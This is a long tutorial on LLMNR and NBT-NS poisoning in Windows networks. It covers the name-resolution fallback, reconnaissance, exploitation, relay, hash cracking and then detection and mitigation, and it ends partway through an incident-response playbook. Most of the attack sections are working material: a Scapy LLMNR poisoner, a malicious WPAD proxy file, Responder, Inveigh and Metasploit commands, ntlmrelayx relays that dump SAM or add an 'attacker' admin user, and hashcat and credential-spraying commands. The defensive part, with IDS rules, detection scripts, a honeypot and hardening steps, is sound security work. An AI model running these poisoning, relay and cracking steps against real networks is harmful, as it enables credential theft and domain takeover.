# LLMNR Poisoning:

## Table of Contents
1. Introduction to LLMNR Poisoning
2. Name Resolution Fundamentals
3. Technical Details of LLMNR Protocol
4. What Causes LLMNR Vulnerabilities
5. NetBIOS Name Service (NBT-NS) Poisoning
6. Reconnaissance and Network Analysis
7. Exploitation Techniques and Tools
8. Credential Capture and Relay Attacks
9. Hash Cracking and Post-Exploitation
10. Detection, Prevention, and Mitigation

---

## 1. Introduction to LLMNR Poisoning

### What is LLMNR Poisoning?

LLMNR (Link-Local Multicast Name Resolution) Poisoning is a man-in-the-middle attack that exploits the Windows name resolution fallback mechanism. When DNS fails to resolve a hostname, Windows systems fall back to LLMNR and NBT-NS, broadcasting requests to the local network. Attackers respond to these broadcasts, impersonating the requested host and capturing authentication credentials.

### Attack Classification

**Attack Type**: Credential Access (MITRE ATT&CK T1557.001)
**Prerequisites**:
- Local network access (same subnet/VLAN)
- LLMNR/NBT-NS enabled on target systems
- User activity generating name resolution requests

**Impact Level**: High - Captures NTLMv1/v2 hashes for offline cracking

### Why LLMNR Poisoning is Effective

**Key Advantages for Attackers:**
- Passive credential harvesting without active exploitation
- Works in default Windows configurations
- Users authenticate automatically without prompting
- Captures domain credentials in multi-user environments
- Difficult to detect without proper monitoring
- No initial credentials required

**Common Scenarios:**
- Initial network access during penetration tests
- Credential harvesting in segmented networks
- Capturing service account credentials
- Escalating privileges through credential collection
- Bypassing network access controls

### Historical Context

**Timeline:**
- **2007**: LLMNR introduced in Windows Vista
- **2013**: NBT-NS attacks popularized in penetration testing
- **2014**: Responder tool gains widespread adoption
- **2016**: WPAD (Web Proxy Auto-Discovery) attacks integrated
- **Present**: Still effective in many corporate environments

---

## 2. Name Resolution Fundamentals

### Windows Name Resolution Order

Windows systems follow a specific order when resolving hostnames:

**Resolution Sequence:**
```
1. Local Host File (%SystemRoot%\System32\drivers\etc\hosts)
2. DNS Cache (previously resolved names)
3. DNS Server Query (primary name resolution)
4. Link-Local Multicast Name Resolution (LLMNR)
5. NetBIOS Name Service (NBT-NS)
```

### Why Name Resolution Fails

**Common Failure Scenarios:**
- **Typos in UNC paths**: `\\fileserver` vs `\\filesever`
- **Non-existent hosts**: Accessing decommissioned servers
- **Network outages**: Temporary DNS server unavailability
- **Misconfigured DNS**: Missing or incorrect DNS records
- **Split DNS issues**: Internal vs external name resolution
- **Legacy applications**: Hardcoded hostnames that no longer exist

### The Fallback Problem

**Why Fallbacks Create Vulnerabilities:**
```
User types: \\FileServerr\Share (typo)
    ↓
DNS Query: "FileServerr" → No Response
    ↓
LLMNR Broadcast: "Who has FileServerr?" → Attacker responds: "I do!"
    ↓
User attempts authentication → Attacker captures NTLMv2 hash
```

**The Security Gap:**
- No authentication of LLMNR responses
- No verification of responder legitimacy
- Automatic credential sending
- Multicast allows any host to respond

### DNS vs LLMNR vs NBT-NS Comparison

| Feature | DNS | LLMNR | NBT-NS |
|---------|-----|-------|--------|
| Protocol | UDP/TCP 53 | UDP 5355 | UDP 137 |
| Scope | Global | Link-local | Broadcast |
| Authentication | DNSSEC (optional) | None | None |
| Windows Version | All | Vista+ | All |
| IPv6 Support | Yes | Yes | No |
| Multicast | No | Yes | No (broadcast) |

---

## 3. Technical Details of LLMNR Protocol

### LLMNR Protocol Specifications

**RFC 4795 Overview:**
- Designed for local network name resolution
- Uses multicast queries on local subnet
- Operates without infrastructure (serverless)
- Intended as DNS fallback mechanism

### LLMNR Packet Structure

```
LLMNR Query Packet:
├── Transaction ID (2 bytes)
├── Flags (2 bytes)
│   ├── QR (Query/Response bit)
│   ├── Opcode (4 bits)
│   ├── C (Conflict bit)
│   ├── TC (Truncation bit)
│   ├── T (Tentative bit)
│   └── RCODE (Response code)
├── Question Count (2 bytes)
├── Answer Count (2 bytes)
├── Authority Count (2 bytes)
├── Additional Count (2 bytes)
└── Question Section
    ├── Name (variable length)
    ├── Type (2 bytes)
    └── Class (2 bytes)
```

### Multicast Addresses

**IPv4 Multicast:**
- Address: `224.0.0.252`
- Port: `5355/UDP`

**IPv6 Multicast:**
- Address: `FF02::1:3`
- Port: `5355/UDP`

### LLMNR Query Process

**Step 1: DNS Failure**
```
Client → DNS Server: "What's the IP of fileserver?"
DNS Server → Client: "NXDOMAIN (no such host)"
```

**Step 2: LLMNR Multicast Query**
```
Client → Multicast (224.0.0.252:5355): "Who has 'fileserver'?"
All hosts on subnet receive the query
```

**Step 3: Legitimate vs Malicious Response**
```
Legitimate: No response (host doesn't exist)
Malicious: Attacker → Client: "I am 'fileserver' at 192.168.1.100"
```

**Step 4: Authentication Attempt**
```
Client → Attacker (192.168.1.100): Attempts SMB authentication
Client sends NTLMv2 hash to attacker's fake SMB server
```

### LLMNR vs mDNS

**Multicast DNS (mDNS) Differences:**
- **mDNS**: Used by Apple/Linux systems (`.local` domain)
- **Port**: 5353/UDP
- **Address**: 224.0.0.251 (IPv4), FF02::FB (IPv6)
- **Scope**: Similar vulnerability to LLMNR but different ecosystem

---

## 4. What Causes LLMNR Vulnerabilities

### Default Windows Configuration

**Enabled by Default:**
```powershell
# Check LLMNR status
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name EnableMulticast

# Check current LLMNR state
Get-NetAdapter | Get-DnsClient | Select-Object -Property InterfaceAlias, ConnectionSpecificSuffix, RegisterThisConnectionsAddress, UseSuffixWhenRegistering
```

**Registry Key:**
```
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient
EnableMulticast = 0 (Disabled) or 1 (Enabled)
```

### Network Misconfigurations

#### DNS Infrastructure Issues
**Common Problems:**
- Single DNS server (single point of failure)
- No redundant DNS servers
- Slow DNS response times
- DNS server overloading
- Improper DNS forwarding configuration
- Split-brain DNS misconfigurations

#### Network Segmentation Failures
**Vulnerable Scenarios:**
- Flat network architectures
- Insufficient VLAN segmentation
- Guest networks on corporate VLANs
- IoT devices on user networks
- Printers on administrative networks

### User Behavior Factors

#### Typing Errors
```
Common typos that trigger LLMNR:
\\filesever\share      (instead of \\fileserver\share)
\\printter\queue       (instead of \\printer\queue)
\\dc1\SYSVL           (instead of \\dc1\SYSVOL)
\\webserver1          (instead of \\webserver)
```

#### Bookmarked Invalid Paths
- Old server names in browser favorites
- Outdated shortcuts on desktop
- Legacy mapped drives
- Script references to decommissioned systems

#### Application Misconfigurations
```
Applications that generate LLMNR traffic:
- Microsoft Office (accessing network templates)
- Web browsers (intranet site resolution)
- File Explorer (network neighborhood browsing)
- Email clients (accessing attachments on shares)
- Custom business applications (hardcoded paths)
```

### Legacy Protocol Dependencies

#### SMB/CIFS Name Resolution
**Default Behavior:**
```
User accesses: \\servername\share
    ↓
If DNS fails → LLMNR query for "servername"
    ↓
If LLMNR fails → NBT-NS query for "servername"
    ↓
All stages vulnerable to poisoning
```

#### Windows Features Using Name Resolution
- **Network Discovery**: Broadcasts LLMNR queries
- **Homegroup**: Legacy feature still generating traffic
- **Work Folders**: Sync client name resolution
- **BranchCache**: Distributed cache discovery
- **DirectAccess**: VPN alternative using name resolution

---

## 5. NetBIOS Name Service (NBT-NS) Poisoning

### NBT-NS Protocol Overview

**NetBIOS over TCP/IP:**
- **Port**: 137/UDP (name service)
- **Port**: 138/UDP (datagram service)
- **Port**: 139/TCP (session service)
- **Legacy Protocol**: Pre-dates modern DNS

### NBT-NS vs LLMNR

| Aspect | NBT-NS | LLMNR |
|--------|--------|-------|
| Age | 1980s | 2000s |
| Transport | Broadcast | Multicast |
| Windows Version | All versions | Vista+ |
| IPv6 | No | Yes |
| Scope | Broadcast domain | Link-local |
| Modern Usage | Decreasing | Common |

### NBT-NS Name Resolution Process

**Query Sequence:**
```
1. Client broadcasts: "What's the IP of SERVERNAME?"
2. All hosts on broadcast domain receive query
3. Legitimate host (if exists) responds with IP
4. Attacker also responds claiming to be SERVERNAME
5. Client uses first response (often attacker's)
```

### NBT-NS Packet Structure

```
NBT-NS Query:
├── Transaction ID (2 bytes)
├── Flags (2 bytes)
├── Question Count (2 bytes)
├── Answer Count (2 bytes)
├── Name Service (2 bytes)
├── Additional Records (2 bytes)
└── Question
    ├── Encoded Name (34 bytes)
    ├── Type (2 bytes) - 0x0020 (NB)
    └── Class (2 bytes) - 0x0001 (IN)
```

### WPAD Protocol Exploitation

#### Web Proxy Auto-Discovery Protocol
**How WPAD Works:**
```
1. Browser queries: "wpad.company.com"
2. If DNS fails → LLMNR query for "wpad"
3. Attacker responds claiming to be WPAD server
4. Client requests: http://attacker-ip/wpad.dat
5. Attacker serves malicious PAC file
6. All web traffic now proxied through attacker
```

**Malicious WPAD Configuration:**
```javascript
function FindProxyForURL(url, host) {
    if (url.substring(0, 5) == "http:" ||
        url.substring(0, 6) == "https:") {
        return "PROXY attackerip:8080";
    }
    return "DIRECT";
}
```

### Combined LLMNR and NBT-NS Attacks

**Why Attack Both:**
- Different Windows versions prioritize differently
- NBT-NS catches older systems (XP, Server 2003)
- LLMNR catches modern systems (Windows 7+)
- Maximum credential capture across diverse networks

---

## 6. Reconnaissance and Network Analysis

### Network Discovery

#### Passive Network Monitoring
```bash
# Identify network range
ip addr show
route -n

# Discover active hosts
netdiscover -r 192.168.1.0/24 -p

# ARP scanning
arp-scan --localnet
```

#### Active Host Enumeration
```bash
# Nmap discovery scan
nmap -sn 192.168.1.0/24

# Identify Windows hosts
nmap -sS -O 192.168.1.0/24 --osscan-guess

# Check for SMB services
nmap -p 445,139 192.168.1.0/24
```

### Traffic Analysis

#### Wireshark Capture Filters
```bash
# Capture LLMNR traffic
udp port 5355

# Capture NBT-NS traffic
udp port 137

# Capture SMB authentication
tcp port 445 or tcp port 139

# Combined filter
udp port 5355 or udp port 137 or tcp port 445
```

#### Wireshark Display Filters
```
# LLMNR queries
llmnr

# NBT-NS queries
nbns

# SMB negotiations
smb2.cmd == 0x0000

# NTLM authentication
ntlmssp

# Failed name resolutions (good targets)
dns.flags.rcode != 0
```

### Identifying LLMNR/NBT-NS Activity

#### PowerShell Detection Script
```powershell
# Check for LLMNR queries
Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-DNS-Client/Operational'
    ID=3008
} | Where-Object {$_.Message -like "*LLMNR*"}

# Monitor network adapter for multicast
Get-NetAdapter | Get-NetAdapterBinding | Where-Object {$_.ComponentID -eq "ms_tcpip"}
```

#### Python Network Sniffer
```python
from scapy.all import *

def detect_llmnr_nbtns(packet):
    if packet.haslayer(UDP):
        # LLMNR detection
        if packet[UDP].dport == 5355 or packet[UDP].sport == 5355:
            print(f"[LLMNR] Query from {packet[IP].src} for: {packet[DNS].qd.qname.decode()}")
        
        # NBT-NS detection
        elif packet[UDP].dport == 137 or packet[UDP].sport == 137:
            print(f"[NBT-NS] Query from {packet[IP].src}")

# Start sniffing
sniff(filter="udp port 5355 or udp port 137", prn=detect_llmnr_nbtns)
```

### Environment Assessment

#### Checking Enterprise Defenses
```bash
# Test if network monitoring is present
# Generate suspicious LLMNR queries and monitor for response

# Check for network segmentation
traceroute target_subnet_gateway

# Test egress filtering
nc -v external_ip 443
```

#### Identifying High-Value Targets
```powershell
# Find domain controllers
nslookup -type=SRV _ldap._tcp.dc._msdcs.company.com

# Enumerate domain computers
Get-ADComputer -Filter * | Select Name,OperatingSystem

# Identify file servers
Get-ADComputer -Filter {OperatingSystem -like "*Server*"} -Properties *
```

---

## 7. Exploitation Techniques and Tools

### Responder Tool

#### Installation and Setup
```bash
# Clone from GitHub
git clone https://github.com/lgandx/Responder.git
cd Responder

# Install Python dependencies
pip install -r requirements.txt

# Make executable
chmod +x Responder.py
```

#### Basic Usage
```bash
# Listen on default interface
sudo python3 Responder.py -I eth0

# Analyze mode (passive, no poisoning)
sudo python3 Responder.py -I eth0 -A

# Enable verbose output
sudo python3 Responder.py -I eth0 -v

# Specify log directory
sudo python3 Responder.py -I eth0 -v -d -w -r -f
```

#### Advanced Responder Options
```bash
# Full poisoning with all services
sudo python3 Responder.py -I eth0 -wrf

# WPAD rogue proxy server
sudo python3 Responder.py -I eth0 -F -w

# Force NTLM authentication (downgrade from NTLMv2)
sudo python3 Responder.py -I eth0 --lm

# Custom challenge for cracking
sudo python3 Responder.py -I eth0 -v --lm --disable-ess

# Log to specific file
sudo python3 Responder.py -I eth0 -v -d -P -w -r -f -F
```

#### Responder Configuration File
```ini
# /etc/responder/Responder.conf

[Responder Core]
; Servers to start
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On
DCERPC = On
WinRM = On

[LLMNR]
Respond = On

[NBT-NS]
Respond = On

[DNS]
Respond = On

[DHCP]
Respond = Off
```

### Inveigh (Windows-based Tool)

#### PowerShell Inveigh
```powershell
# Import Inveigh
Import-Module .\Inveigh.ps1

# Basic execution
Invoke-Inveigh

# Full options
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y -FileOutput Y -FileOutputDirectory C:\Temp

# Specific poisoning
Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -StatusOutput Y

# With packet sniffing
Invoke-Inveigh -SnifferIP 192.168.1.100 -ConsoleOutput Y
```

#### Inveigh Relay
```powershell
# SMB relay attack
Invoke-InveighRelay -ConsoleOutput Y -StatusOutput Y -Target 192.168.1.50

# Relay with specific command execution
Invoke-InveighRelay -ConsoleOutput Y -Target 192.168.1.50 -Command "net user attacker Password123! /add"
```

#### C# Inveigh (Inveigh.exe)
```cmd
# Basic execution
Inveigh.exe

# Console output with LLMNR and NBNS
Inveigh.exe -LLMNR Y -NBNS Y -ConsoleOutput Y

# With specific network adapter
Inveigh.exe -IP 192.168.1.100 -LLMNR Y
```

### mitm6 (IPv6 Attack Tool)

#### Installation
```bash
# Install via pip
pip install mitm6

# Install from source
git clone https://github.com/fox-it/mitm6.git
cd mitm6
python setup.py install
```

#### Basic IPv6 MITM Attack
```bash
# Basic attack on domain
sudo mitm6 -d company.local

# Specify interface
sudo mitm6 -d company.local -i eth0

# With DNS spoofing
sudo mitm6 -d company.local --ignore-nofqdn

# Combined with ntlmrelayx
sudo mitm6 -d company.local -i eth0 &
sudo ntlmrelayx.py -6 -t ldaps://dc.company.local -wh attacker-wpad.company.local
```

### Custom Python Poisoner

```python
#!/usr/bin/env python3
import socket
import struct
from scapy.all import *

class LLMNRPoisoner:
    def __init__(self, interface, attacker_ip):
        self.interface = interface
        self.attacker_ip = attacker_ip
        self.captured_hashes = []
    
    def build_llmnr_response(self, query_packet):
        """Build LLMNR response packet"""
        response = IP(dst=query_packet[IP].src, src=self.attacker_ip)
        response /= UDP(dport=query_packet[UDP].sport, sport=5355)
        
        # Build DNS response
        dns_response = DNS(
            id=query_packet[DNS].id,
            qr=1,  # Response
            aa=1,  # Authoritative
            qd=query_packet[DNS].qd,
            an=DNSRR(
                rrname=query_packet[DNS].qd.qname,
                type='A',
                rdata=self.attacker_ip,
                ttl=30
            )
        )
        
        response /= dns_response
        return response
    
    def handle_llmnr_query(self, packet):
        """Handle incoming LLMNR queries"""
        if packet.haslayer(DNS) and packet.haslayer(UDP):
            if packet[UDP].dport == 5355:
                query_name = packet[DNS].qd.qname.decode()
                print(f"[+] LLMNR Query for: {query_name} from {packet[IP].src}")
                
                # Send poisoned response
                response = self.build_llmnr_response(packet)
                send(response, verbose=0)
                print(f"[+] Sent poisoned response: {self.attacker_ip}")
    
    def start_poisoning(self):
        """Start LLMNR poisoning attack"""
        print(f"[*] Starting LLMNR poisoning on {self.interface}")
        print(f"[*] Attacker IP: {self.attacker_ip}")
        
        sniff(
            iface=self.interface,
            filter="udp port 5355",
            prn=self.handle_llmnr_query,
            store=0
        )

# Usage
if __name__ == "__main__":
    poisoner = LLMNRPoisoner("eth0", "192.168.1.100")
    poisoner.start_poisoning()
```

### Metasploit Modules

#### LLMNR/NBNS Spoofer Module
```bash
# Start Metasploit
msfconsole

# Load LLMNR spoofer
use auxiliary/spoof/llmnr/llmnr_response
set INTERFACE eth0
set REGEX .*
run

# Load NBNS spoofer
use auxiliary/spoof/nbns/nbns_response
set INTERFACE eth0
set SPOOFIP 192.168.1.100
run
```

#### SMB Capture Module
```bash
# SMB hash capture
use auxiliary/server/capture/smb
set JOHNPWFILE /tmp/hashes.txt
run
```

---

## 8. Credential Capture and Relay Attacks

### NTLM Authentication Process

#### Challenge-Response Mechanism
```
Step 1: Client → Server: "I want to authenticate as DOMAIN\user"

Step 2: Server → Client: Challenge (8 random bytes)

Step 3: Client encrypts challenge with password hash
        NTLMv2: HMAC-MD5(hash, challenge + client_challenge + timestamp + target_info)

Step 4: Client → Server: Response (encrypted challenge)

Step 5: Server validates response against stored hash
```

### Hash Format Analysis

#### NTLMv1 Hash Structure
```
username::domain:LM_response:NTLM_response:challenge

Example:
john::COMPANY:18B568F5F7F34B1E8AD64F2E98F36D4E:C6B8E9F5E2E8E4F5E9E4F5E8E4F5E9E4:1122334455667788
```

#### NTLMv2 Hash Structure
```
username::domain:challenge:HMAC-MD5:blob

Example:
admin::COMPANY:1122334455667788:9C84D3E8AF8F5E8F9E4F5E8E4F5E9E4F:0101000000000000C0653150DE09D201FFFFFF...
```

### Responder Hash Capture

#### Captured Hash Locations
```bash
# Default Responder log directory
cd ~/Responder/logs/

# View captured NTLMv2 hashes
cat SMB-NTLMv2-SSP-192.168.1.50.txt

# View HTTP NTLMv2 hashes
cat HTTP-NTLMv2-192.168.1.50.txt

# Consolidated hash file
cat Responder-Session.log
```

#### Real-time Hash Monitoring
```bash
# Watch log files for new hashes
tail -f ~/Responder/logs/*.txt

# Parse and extract unique hashes
grep "NTLMv2" ~/Responder/logs/*.txt | sort -u
```

### SMB Relay Attacks

#### ntlmrelayx.py (Impacket)
```bash
# Basic SMB relay
ntlmrelayx.py -tf targets.txt -smb2support

# Relay to specific target
ntlmrelayx.py -t 192.168.1.50 -smb2support

# Execute commands on relay
ntlmrelayx.py -t 192.168.1.50 -smb2support -c "whoami"

# Dump SAM database
ntlmrelayx.py -t 192.168.1.50 -smb2support --dump-sam

# Dump NTDS.dit (if DC)
ntlmrelayx.py -t 192.168.1.10 -smb2support --dump-laps --dump-gmsa --dump-adcs
```

#### SMB Signing Bypass
```bash
# Identify targets without SMB signing
netexec smb 192.168.1.0/24 --gen-relay-list targets.txt

# Use targets for relay
ntlmrelayx.py -tf targets.txt -smb2support -socks
```

### HTTP to SMB Relay

#### MultiRelay.py (Responder)
```bash
# Relay HTTP authentication to SMB
cd ~/Responder/tools
python3 MultiRelay.py -t 192.168.1.50 -u ALL

# With command execution
python3 MultiRelay.py -t 192.168.1.50 -u ALL -c "net user attacker Pass123! /add"
```

### LDAP Relay Attacks

#### Relay to LDAP for Privilege Escalation
```bash
# Relay to LDAP (requires LDAPS)
ntlmrelayx.py -t ldaps://dc.company.com --escalate-user lowpriv_user

# Add computer account
ntlmrelayx.py -t ldaps://dc.company.com --add-computer

# Dump domain info
ntlmrelayx.py -t ldap://dc.company.com --dump-adcs --dump-laps
```

### SOCKS Proxy for Credential Reuse

#### Setting up SOCKS Proxy with ntlmrelayx
```bash
# Start ntlmrelayx with SOCKS
ntlmrelayx.py -tf targets.txt -smb2support -socks

# Check active sessions
ntlmrelayx> socks

# Use captured sessions through proxychains
proxychains smbclient.py -no-pass DOMAIN/user@target
proxychains secretsdump.py -no-pass DOMAIN/user@target
```

---

## 9. Hash Cracking and Post-Exploitation

### Hash Extraction and Preparation

#### Extracting Hashes from Responder Logs
```bash
# Extract all NTLMv2 hashes
grep -r "NTLMv2" ~/Responder/logs/ | cut -d':' -f4- > ntlmv2_hashes.txt

# Clean and format hashes
cat ntlmv2_hashes.txt | sort -u > clean_hashes.txt

# Count unique hashes
cat clean_hashes.txt | wc -l
```

#### Hash Format Conversion
```bash
# Convert to hashcat format (if needed)
# NTLMv2 is already in correct format for hashcat mode 5600

# For John the Ripper
# Already compatible with john format
```

### Hashcat Cracking Techniques

#### Basic Hashcat Commands
```bash
# NTLMv2 cracking with wordlist
hashcat -m 5600 ntlmv2_hashes.txt rockyou.txt

# With rules
hashcat -m 5600 ntlmv2_hashes.txt rockyou.txt -r best64.rule

# Mask attack for common patterns
hashcat -m 5600 ntlmv2_hashes.txt -a 3 ?u?l?l?l?l?l?d?d

# Combination attack
hashcat -m 5600 ntlmv2_hashes.txt -a 1 wordlist1.txt wordlist2.txt
```

#### Optimized Corporate Cracking
```bash
# Company-specific wordlist
cat > company_words.txt << EOF
CompanyName
Company123
Company!
CompanyName2024
Welcome123
Password123
$(season)$(year)
EOF

# Rule-based corporate password cracking
hashcat -m 5600 hashes.txt company_words.txt -r corporate.rule

# Custom masks for corporate policies
# Minimum 8 chars, 1 uppercase, 1 lowercase, 1 number, 1 special
hashcat -m 5600 hashes.txt -a 3 -1 ?l?u -2 ?d?s ?1?1?1?1?1?2?2?2 --increment
```

#### Advanced Hashcat Strategies
```bash
# Multi-GPU acceleration
hashcat -m 5600 hashes.txt rockyou.txt -O -w 4 -d 1,2,3

# Hybrid attack (wordlist + mask)
hashcat -m 5600 hashes.txt -a 6 rockyou.txt ?d?d?d?d

# Combinator with rules
hashcat -m 5600 hashes.txt -a 1 wordlist1.txt wordlist2.txt -j '$!' -k '$1'

# Show cracked passwords
hashcat -m 5600 hashes.txt --show
```

### John the Ripper Alternative

#### Basic John Commands
```bash
# Crack with wordlist
john --wordlist=rockyou.txt --format=netntlmv2 hashes.txt

# With rules
john --wordlist=rockyou.txt --rules=Jumbo --format=netntlmv2 hashes.txt

# Show cracked passwords
john --show --format=netntlmv2 hashes.txt

# Generate custom wordlist with John
john --wordlist=base.txt --rules --stdout > generated.txt
```

### Post-Cracking Analysis

#### Credential Validation
```bash
# Test credentials with crackmapexec
crackmapexec smb 192.168.1.0/24 -u user1 -p 'Password123!'

# Spray credentials across domain
crackmapexec smb targets.txt -u users.txt -p passwords.txt --continue-on-success

# Check for local admin access
crackmapexec smb targets.txt -u admin -p 'Pass123!' --local-auth
```

#### Credential Categorization
```python
#!/usr/bin/env python3
def categorize_credentials(cracked_hashes):
    """Categorize cracked credentials by type"""
    categories = {
        'domain_admin': [],
        'service_accounts': [],
        'user_accounts': [],
        'local_admin': []
    }
    
    for cred in cracked_hashes:
        username, domain, password = parse_credential(cred)
        
        # Check account type
        if 'admin' in username.lower() or 'adm' in username.lower():
            if domain.upper() == 'COMPANY':
                categories['domain_admin'].append(cred)
            else:
                categories['local_admin'].append(cred)
        elif 'svc' in username.lower() or 'service' in username.lower():
            categories['service_accounts'].append(cred)
        else:
            categories['user_accounts'].append(cred)
    
    return categories
```

### Lateral Movement Planning

#### BloodHound Integration
```bash
# Collect data with compromised credentials
bloodhound-python -u username -p password -d company.com -c all -gc dc.company.com

# Import into BloodHound
# Analyze attack paths from compromised accounts
```

#### Privilege Assessment
```powershell
# Check group memberships
Get-ADPrincipalGroupMembership username | Select Name

# Find computers where user has admin rights
Find-LocalAdminAccess -Username username

# Enumerate accessible shares
Find-DomainShare -CheckShareAccess -Username username
```

---

## 10. Detection, Prevention, and Mitigation

### Detection Strategies

#### Network-Based Detection

**IDS/IPS Signatures:**
```
# Snort rule for LLMNR poisoning
alert udp any any -> 224.0.0.252 5355 (msg:"Possible LLMNR Query"; sid:1000001;)
alert udp any 5355 -> any any (msg:"Possible LLMNR Response from non-standard host"; sid:1000002;)

# Zeek/Bro script for LLMNR detection
event dns_request(c: connection, msg: dns_msg, query: string, qtype: count, qclass: count) {
    if (c$id$resp_p == 5355/udp) {
        NOTICE([$note=LLMNR_Query,
                $msg=fmt("LLMNR query for %s from %s", query, c$id$orig_h),
                $conn=c]);
    }
}
```

#### Host-Based Detection

**Windows Event Log Monitoring:**
```powershell
# Monitor for multiple authentication failures
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    ID=4625,4776
    StartTime=(Get-Date).AddHours(-1)
} | Group-Object {$_.Properties[5].Value} | Where-Object {$_.Count -gt 10}

# Monitor for NTLM authentication to unusual hosts
Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-NTLM/Operational'
    ID=8004
} | Where-Object {$_.Message -like "*192.168.1.100*"}  # Attacker IP
```

**PowerShell Detection Script:**
```powershell
function Detect-LLMNRPoisoning {
    param(
        [int]$ThresholdMinutes = 60,
        [int]$FailureThreshold = 5
    )
    
    # Check for rapid authentication attempts
    $Events = Get-WinEvent -FilterHashtable @{
        LogName='Security'
        ID=4776
        StartTime=(Get-Date).AddMinutes(-$ThresholdMinutes)
    }
    
    # Group by target computer
    $Grouped = $Events | Group-Object {$_.Properties[2].Value}
    
    # Alert on suspicious patterns
    foreach ($Group in $Grouped) {
        if ($Group.Count -gt $FailureThreshold) {
            Write-Warning "Potential LLMNR poisoning detected!"
            Write-Warning "Target: $($Group.Name)"
            Write-Warning "Attempts: $($Group.Count)"
            
            # Get unique source IPs
            $Sources = $Group.Group | ForEach-Object {$_.Properties[6].Value} | Sort-Object -Unique
            Write-Warning "Source IPs: $($Sources -join ', ')"
        }
    }
}

# Run detection
Detect-LLMNRPoisoning -ThresholdMinutes 30 -FailureThreshold 10
```

### Prevention Measures

#### Disabling LLMNR via Group Policy

**GPO Configuration:**
```
Computer Configuration
  └─ Administrative Templates
      └─ Network
          └─ DNS Client
              └─ Turn off multicast name resolution: Enabled
```

**Registry Method:**
```cmd
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" /v EnableMulticast /t REG_DWORD /d 0 /f
```

**PowerShell Script for Domain:**
```powershell
# Disable LLMNR on all domain computers
$Computers = Get-ADComputer -Filter * | Select-Object -ExpandProperty Name

foreach ($Computer in $Computers) {
    Invoke-Command -ComputerName $Computer -ScriptBlock {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name EnableMulticast -Value 0
    } -ErrorAction SilentlyContinue
}
```

#### Disabling NBT-NS

**Network Adapter Configuration:**
```powershell
# Disable NetBIOS over TCP/IP for all adapters
Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True" | ForEach-Object {
    $_.SetTcpipNetbios(2)  # 2 = Disable NetBIOS
}

# Via registry
$Adapters = Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services\NetBT\Parameters\Interfaces"
foreach ($Adapter in $Adapters) {
    Set-ItemProperty -Path $Adapter.PSPath -Name NetbiosOptions -Value 2
}
```

**Group Policy Method:**
```
Create GPO → Computer Configuration → Preferences → Windows Settings
→ Registry → New Registry Item
Key: HKLM\SYSTEM\CurrentControlSet\Services\NetBT\Parameters\Interfaces\<Interface GUID>
Value: NetbiosOptions
Type: REG_DWORD
Data: 2
```

#### SMB Signing Enforcement

**Enable SMB Signing:**
```
Computer Configuration → Windows Settings → Security Settings
→ Local Policies → Security Options

"Microsoft network server: Digitally sign communications (always)" = Enabled
"Microsoft network client: Digitally sign communications (always)" = Enabled
```

**PowerShell Validation:**
```powershell
# Check SMB signing status
Get-SmbServerConfiguration | Select EnableSecuritySignature,RequireSecuritySignature

# Enable SMB signing
Set-SmbServerConfiguration -RequireSecuritySignature $true -Force
Set-SmbClientConfiguration -RequireSecuritySignature $true -Force
```

### Network Segmentation

#### VLAN Isolation
**Best Practices:**
```
- Separate VLANs for:
  * User workstations
  * Servers (file/application)
  * Domain controllers
  * Management interfaces
  * Guest/visitor networks
  * IoT devices

- Implement VLAN ACLs preventing cross-VLAN LLMNR/NBT-NS
```

#### Firewall Rules
```bash
# Block LLMNR at firewall level
iptables -A INPUT -p udp --dport 5355 -j DROP
iptables -A OUTPUT -p udp --dport 5355 -j DROP

# Block NBT-NS
iptables -A INPUT -p udp --dport 137 -j DROP
iptables -A OUTPUT -p udp --dport 137 -j DROP

# Windows Firewall
netsh advfirewall firewall add rule name="Block LLMNR" dir=in protocol=udp localport=5355 action=block
netsh advfirewall firewall add rule name="Block NBT-NS" dir=in protocol=udp localport=137 action=block
```

### Monitoring and Alerting

#### SIEM Integration
```python
# Example: Splunk query for LLMNR poisoning detection
"""
index=windows sourcetype=WinEventLog:Security EventCode=4776
| bucket _time span=5m
| stats count by _time, Computer, TargetUserName
| where count > 10
| eval alert="Potential LLMNR Poisoning Attack"
"""

# ELK Stack detection
"""
{
  "query": {
    "bool": {
      "must": [
        {"match": {"event.code": "4776"}},
        {"range": {"@timestamp": {"gte": "now-1h"}}}
      ]
    }
  },
  "aggs": {
    "by_computer": {
      "terms": {"field": "computer.name"},
      "aggs": {
        "event_count": {"value_count": {"field": "_id"}}
      }
    }
  }
}
"""
```

#### Honeypot Deployment
```python
#!/usr/bin/env python3
"""
LLMNR/NBT-NS Honeypot
Logs poisoning attempts without responding
"""

from scapy.all import *
import logging

logging.basicConfig(
    filename='/var/log/llmnr_honeypot.log',
    level=logging.INFO,
    format='%(asctime)s - %(message)s'
)

def honeypot_callback(packet):
    if packet.haslayer(UDP):
        # LLMNR detection
        if packet[UDP].dport == 5355:
            if packet.haslayer(DNS):
                query = packet[DNS].qd.qname.decode()
                src_ip = packet[IP].src
                logging.warning(f"LLMNR poisoning attempt detected: {src_ip} querying {query}")
                
                # Alert security team
                send_alert(f"LLMNR poisoning from {src_ip}")
        
        # NBT-NS detection
        elif packet[UDP].dport == 137:
            src_ip = packet[IP].src
            logging.warning(f"NBT-NS poisoning attempt detected from: {src_ip}")

def send_alert(message):
    """Send alert to security team"""
    # Implementation: Email, Slack, SIEM, etc.
    pass

# Start honeypot
sniff(filter="udp port 5355 or udp port 137", prn=honeypot_callback, store=0)
```

### Incident Response Playbook

#### Detection Phase
```
1. Identify anomalous authentication patterns
2. Correlate with network traffic logs
3. Identify attacker IP/MAC address
4. Determine scope of compromise
```

#### Containment Phase
```
1. Isolate attacker system from network
2. Reset passwords for compromised accounts
